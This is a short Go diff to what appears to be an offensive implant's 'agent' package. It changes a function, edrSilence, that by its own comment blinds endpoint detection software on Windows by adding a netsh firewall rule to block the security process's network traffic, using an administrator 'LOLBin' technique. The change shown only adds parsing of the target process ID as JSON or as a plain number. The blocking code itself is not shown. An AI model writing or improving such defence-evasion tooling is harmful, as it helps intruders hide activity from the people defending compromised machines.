@@ -3,6 +3,7 @@
 package agent
 
 import (
+	"encoding/json"
 	"fmt"
 	"strings"
 
@@ -13,7 +14,17 @@ import (
 // using a Windows Firewall rule added via netsh advfirewall (LOLBin approach).
 // Requires administrator privileges. First resolves the process path from PID.
 func edrSilence(pidStr string) string {
-	pid, err := parseUint32(strings.TrimSpace(pidStr))
+	s := strings.TrimSpace(pidStr)
+	// Accept JSON {"pid":N} or plain integer
+	if strings.HasPrefix(s, "{") {
+		var j struct {
+			PID uint32 `json:"pid"`
+		}
+		if err := json.Unmarshal([]byte(s), &j); err == nil && j.PID != 0 {
+			s = fmt.Sprintf("%d", j.PID)
+		}
+	}
+	pid, err := parseUint32(s)
 	if err != nil {
 		return "[-] invalid PID: " + err.Error()
 	}
